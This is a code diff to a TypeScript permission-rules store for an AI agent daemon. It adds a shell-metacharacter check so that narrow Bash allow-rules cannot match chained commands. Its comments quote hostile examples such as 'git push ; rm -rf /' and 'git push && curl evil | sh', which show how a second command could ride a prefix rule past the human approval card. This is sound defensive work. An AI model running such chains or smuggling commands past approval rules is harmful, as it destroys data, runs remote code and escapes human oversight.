@@ -1,5 +1,6 @@
 import { existsSync, mkdirSync, readFileSync, realpathSync, renameSync, statSync, type Stats, writeFileSync } from "node:fs";
 import { join, sep } from "node:path";
+import { hasShellHazards } from "./shell-scan";
 
 /**
  * CC-grammar allow-rules store (SP-approvals Task 1) — the foundation the engine gate (Task 3)
@@ -20,6 +21,18 @@ import { join, sep } from "node:path";
  *    be many project roots over a daemon's life), so this class owns its own hot cache: a
  *    `Map<root, {mtimeMs, size, rules}>`, re-stat'd on every `decision()`/`rulesFor()` call and
  *    only re-read from disk when the mtime or size actually changed. No `fs.watch` anywhere here.
+ *    Known caveat of that mtime+size check (SP-approvals T1 review): a rewrite that lands within
+ *    the SAME mtime tick AND happens to produce a file of the exact same byte size as what's
+ *    cached is indistinguishable from "unchanged" here, so it would keep serving stale (pre-
+ *    rewrite) rules until a LATER, actually-detectable change arrives. This is the identical
+ *    trade-off any mtime+size change-detector accepts (the one `git`/`make`/etc. have always
+ *    accepted) — there's no `fs.watch`, so there's no event to miss, just a coarse-grained
+ *    torn-read-adjacent staleness window, not a torn read itself (a reader never sees a
+ *    half-written file — `writeFileAtomic` still guarantees that). APFS's mtime resolution is
+ *    fine-grained enough in practice that a same-tick collision needs two writes landing in that
+ *    same tight window, which the human-paced "review and approve a rule" workflow this store
+ *    serves essentially never produces; if it ever matters, the fix is a content hash, not a
+ *    watcher.
  *
  * Resilience: a project rules file that's malformed JSON, the wrong shape, or over 64KB is
  * ignored — the LAST good parse for that root is kept (empty if there never was one), and a
@@ -28,6 +41,20 @@ import { join, sep } from "node:path";
  * is never re-parsed or re-logged on a later call). A rule string neither scope's list can parse
  * gets the same one-warning treatment, deduped by the raw string itself. `decision()` never
  * throws — every failure mode degrades to "ignore it", not an error thrown into the gate path.
+ *
+ * CRITICAL, SP-approvals T1 review: a bash exact/prefix rule NEVER matches a command containing
+ * an unquoted shell metacharacter (`;`, `|`, `&`, newline, redirects, command/process
+ * substitution, ANSI-C quoting — see `shell-scan.ts`'s `hasShellHazards`, run on the call's RAW
+ * command). A naive string-prefix/exact comparison alone let `Bash(git push:*)` match `git push ;
+ * rm -rf /`, `git push && curl evil | sh`, and (via whitespace-normalization folding the newline
+ * into a space) `git push\nrm -rf /` — a chain riding a narrow prefix rule straight past the human
+ * approval card. See `ruleMatches`'s own doc comment for the full mechanics.
+ *
+ * MINOR, same review: `parseRule` rejects (returns `null`) a parenthesized value on any tool OTHER
+ * than Bash (e.g. `"Edit(/path:*)"`) — Edit/Computer/Worktree calls carry no `command` field for
+ * an exact/prefix value to ever compare against, so such a rule could never match anything; it's
+ * treated the same as any other unparseable rule string (ignored, warned once) rather than
+ * silently accepted as a rule that can never fire.
  *
  * Spec deviation, called out explicitly per the SP-approvals brief: this class does NOT seed the
  * CC-parity default `["Computer"]` allow-rule anywhere. That default is a Task-3 concern — it
@@ -87,7 +114,10 @@ function normalizeWhitespace(s: string): string {
  * than throwing; callers (the class below) treat `null` as "ignore this rule, warn once". An
  * empty value (`"Bash()"`, `"Bash(:*)"`) also returns `null` — a rule naming no command at all is
  * far more likely a typo than an intentional "match everything", and CC's own grammar has no such
- * wildcard-via-omission form either (bare `Bash` already covers "any bash call").
+ * wildcard-via-omission form either (bare `Bash` already covers "any bash call"). A parenthesized
+ * value on any tool OTHER than Bash (e.g. `"Edit(/path:*)"`) also returns `null` — see the class
+ * doc comment's "MINOR" note above this function for why (no non-bash call carries a `command`
+ * for such a value to ever compare against, so it could never match anything).
  */
 export function parseRule(s: string): { tool: string; kind: "any" | "exact" | "prefix"; value?: string } | null {
   const m = RULE_GRAMMAR.exec(s);
@@ -95,6 +125,7 @@ export function parseRule(s: string): { tool: string; kind: "any" | "exact" | "p
   const tool = internalToolFor(m[1]!); // group 1 is mandatory in RULE_GRAMMAR — always set on a match
   const content = m[2];
   if (content === undefined) return { tool, kind: "any" }; // bare "Bash" / "Edit" / "Computer" / "Worktree"
+  if (tool !== "bash") return null; // parenthesized value on a tool with no `command` to match — see doc comment above
   if (content.endsWith(":*")) {
     const value = normalizeWhitespace(content.slice(0, -2));
     return value ? { tool, kind: "prefix", value } : null;
@@ -120,18 +151,27 @@ function toolForCallName(name: string): string | null {
   }
 }
 
-/** Best-effort `command` extraction from a tool call's `argsJson`, whitespace-normalized the same
- *  way `parseRule` normalizes a rule's value — so "git   push x" and a rule's "git push" compare
- *  as equal tokens. Malformed JSON or a non-string/absent `command` field (true for every
- *  non-bash tool's args) yields `""`, which a non-empty exact/prefix rule value can never match —
- *  a safe default `ruleMatches` doesn't need to special-case. */
-function normalizedCommand(argsJson: string): string {
+/** Raw (NOT whitespace-normalized) `command` field from a tool call's `argsJson` — the exact
+ *  string that will actually reach a shell. `hasShellHazards` (in `ruleMatches` below) scans
+ *  THIS, never the normalized form — see `ruleMatches`'s own doc comment for why the order
+ *  matters. Malformed JSON or a non-string/absent `command` field (true for every non-bash tool's
+ *  args) yields `""`. */
+function rawCommand(argsJson: string): string {
   try {
     const parsed = JSON.parse(argsJson || "{}") as { command?: unknown };
-    return typeof parsed.command === "string" ? normalizeWhitespace(parsed.command) : "";
+    return typeof parsed.command === "string" ? parsed.command : "";
   } catch {
     return "";
   }
+}
+
+/** `rawCommand`, whitespace-normalized the same way `parseRule` normalizes a rule's value — so
+ *  "git   push x" and a rule's "git push" compare as equal tokens. Used ONLY for the actual
+ *  exact/prefix VALUE comparison, after `hasShellHazards` has already vetted the raw form. `""`
+ *  (from a malformed/non-bash call) can never match a non-empty exact/prefix rule value — a safe
+ *  default `ruleMatches` doesn't need to special-case. */
+function normalizedCommand(argsJson: string): string {
+  return normalizeWhitespace(rawCommand(argsJson));
 }
 
 /**
@@ -140,12 +180,27 @@ function normalizedCommand(argsJson: string): string {
  * equal the rule's value exactly; "prefix" additionally allows the command to continue past the
  * value with a whitespace boundary (`cmd === value || cmd.startsWith(value + " ")` — "git push
  * origin" matches a "git push" prefix rule, "git pushx" does not).
+ *
+ * CRITICAL, SP-approvals T1 review: before that value comparison, a bash exact/prefix rule first
+ * runs `hasShellHazards` on the call's RAW command (`rawCommand`, NOT `normalizedCommand`) and
+ * refuses to match at all if it finds one. Without this, a plain prefix/exact string comparison
+ * cannot tell a whole command from a chain's first link: `"git push".startsWith("git push")` is
+ * true whether the actual command is `git push origin main` (fine) or `git push ; rm -rf /` /
+ * `git push && curl evil | sh` (a SECOND command riding the first one's prefix straight past the
+ * approval card). Checking the RAW string matters specifically because `normalizedCommand`
+ * collapses a literal newline into a space — `git push\nrm -rf /` would otherwise normalize to
+ * "git push rm -rf /", which still starts with "git push " and would have matched; scanning
+ * before that collapse is what actually catches it. This check runs for BOTH "exact" and "prefix"
+ * kinds (a compound command should never auto-match ANY bash rule, not just a prefix one) but NOT
+ * for kind "any" — a bare `Bash` rule is an explicit "allow every bash call" grant with no narrow
+ * scope for a chain to escape from, so there is no analogous hole to close there.
  */
 export function ruleMatches(parsed: NonNullable<ReturnType<typeof parseRule>>, call: { name: string; argsJson: string }): boolean {
   const tool = toolForCallName(call.name);
   if (tool === null || tool !== parsed.tool) return false;
   if (parsed.kind === "any") return true;
   if (parsed.value === undefined) return false; // malformed parsed rule (never produced by parseRule) — never matches
+  if (parsed.tool === "bash" && hasShellHazards(rawCommand(call.argsJson))) return false;
   const cmd = normalizedCommand(call.argsJson);
   if (parsed.kind === "exact") return cmd === parsed.value;
   return cmd === parsed.value || cmd.startsWith(parsed.value + " ");
@@ -346,6 +401,13 @@ export class PermissionRules {
     // silently discard the user's real provider config and every other setting. Let JSON.parse's
     // SyntaxError propagate; there is nothing safe to "preserve other keys" from a file this
     // class can't parse.
+    //
+    // NIT (SP-approvals T1 review): the `: {}` branch below only fires when settings.json doesn't
+    // exist AT ALL, which is unreachable in real operation — the daemon always creates/migrates
+    // one before anything else can run, and `loadSettings()` itself throws on a missing file
+    // rather than tolerating one (see settings.ts). Left permissive rather than throwing here too:
+    // a normaHome with no settings.json yet has nothing to "preserve other keys" FROM either way,
+    // and today only a test that deliberately skips bootstrapping one exercises this branch.
     const obj: any = existsSync(path) ? JSON.parse(readFileSync(path, "utf8")) : {}; // same untyped-any idiom as settings.ts's loadSettings
     obj.permissions ??= {};
     const list: string[] = Array.isArray(obj.permissions.allow) ? [...obj.permissions.allow] : [];
